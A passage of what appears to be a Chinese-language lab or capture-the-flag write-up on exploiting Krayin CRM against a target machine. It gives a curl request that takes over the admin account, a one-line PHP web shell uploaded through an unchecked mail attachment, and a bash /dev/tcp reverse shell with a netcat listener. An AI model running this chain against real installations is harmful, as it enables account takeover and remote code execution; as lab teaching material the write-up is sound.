&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -i -X POST &amp;#34;http://TARGET:8888/install/api/admin-config-setup&amp;#34; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -H &amp;#34;X-Requested-With: XMLHttpRequest&amp;#34; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --data-urlencode &amp;#34;admin=PwnedAdmin&amp;#34; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --data-urlencode &amp;#34;email=attacker@evil.com&amp;#34; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  --data-urlencode &amp;#34;password=Pwned12345&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;也就是说我们可以修改并接管 admin 账号。&lt;/p&gt;
&lt;p&gt;根据靶机IP和端口写好对应的 Payload：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/Krayin2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# curl -i -X POST &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://192.168.1.10/install/api/admin-config-setup&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;X-Requested-With: XMLHttpRequest&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --data-urlencode &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin=PwnedAdmin&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --data-urlencode &lt;span class=&#34;s2&#34;&gt;&amp;#34;email=attacker@evil.com&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  --data-urlencode &lt;span class=&#34;s2&#34;&gt;&amp;#34;password=Pwned12345&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Date: Fri, &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;2026&lt;/span&gt; 06:41:58 GMT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Server: Apache/2.4.68 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Unix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;X-Powered-By: PHP/8.3.35
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Cache-Control: no-cache, private
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Transfer-Encoding: chunked
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这里返回1就算是利用成功了，然后回到登录框使用邮箱和密码登录 &lt;code&gt;attacker@evil.com:Pwned12345&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这时候就想到用另外一个远程代码执行的洞（CVE-2026-38526）去拿 shell ，试了很多 POC 然后又去手测，发现利用点是被修复了的。&lt;/p&gt;
&lt;p&gt;再去找别的利用点，在 Mail 这里有一个 Compose Mail 可以新建邮件，里面可以传附件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/krayin-crm-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/assets/image-20261023144723207.png&#34;
	width=&#34;1664&#34;
	height=&#34;684&#34;
	srcset=&#34;https://Sp1ke-sec.github.io/p/krayin-crm-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/assets/image-20261023144723207_hu13764905312127135128.png 480w, https://Sp1ke-sec.github.io/p/krayin-crm-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/assets/image-20261023144723207_hu17587345131406798634.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20261023144723207&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;243&#34;
		data-flex-basis=&#34;583px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这里传附件不进行任何校验，所以直接创建然后传一个 php 马&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php system($_GET[&amp;#34;cmd&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span&gt; &amp;gt; shell.php 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/krayin-crm-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/assets/image-20261023145306014.png&#34;
	width=&#34;1946&#34;
	height=&#34;823&#34;
	srcset=&#34;https://Sp1ke-sec.github.io/p/krayin-crm-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/assets/image-20261023145306014_hu11487379111393287261.png 480w, https://Sp1ke-sec.github.io/p/krayin-crm-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/assets/image-20261023145306014_hu12254038339214227659.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20261023145306014&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;236&#34;
		data-flex-basis=&#34;567px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;可以看到文件被传到了 &lt;code&gt;http://krayin.dsz/storage/emails/1/shell.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;把 &lt;code&gt;krayin.dsz&lt;/code&gt; 换成对应的 IP 地址即可：&lt;code&gt;http://192.168.1.10/storage/emails/1/shell.php?cmd=id&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/krayin-crm-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/assets/image-20261023145443773.png&#34;
	width=&#34;1232&#34;
	height=&#34;119&#34;
	srcset=&#34;https://Sp1ke-sec.github.io/p/krayin-crm-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/assets/image-20261023145443773_hu2324521883421684379.png 480w, https://Sp1ke-sec.github.io/p/krayin-crm-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/assets/image-20261023145443773_hu1493703241556696681.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20261023145443773&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1035&#34;
		data-flex-basis=&#34;2484px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;获取权限&#34;&gt;获取权限
&lt;/h2&gt;&lt;p&gt;反弹一个 shell 回来：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -lvnp &lt;span class=&#34;m&#34;&gt;1234&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl --get --data-urlencode &lt;span class=&#34;s2&#34;&gt;&amp;#34;cmd=bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.8/1234 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;&amp;gt; http://192.168.1.10/storage/emails/1/shell.php
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;拿到 shell 之后&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /home/krayin2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls -la
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat user.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/krayin-crm-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/assets/image-20261023150120072.png&#34;
	width=&#34;609&#34;
	height=&#34;94&#34;
	srcset=&#34;https://Sp1ke-sec.github.io/p/krayin-crm-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/assets/image-20261023150120072_hu12508872528977333115.png 480w, https://Sp1ke-sec.github.io/p/krayin-crm-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/assets/image-20261023150120072_hu2801765438688714652.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20261023150120072&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;647&#34;
		data-flex-basis=&#34;1554px&#34;
	
&gt;&lt;/p&gt;
</description>
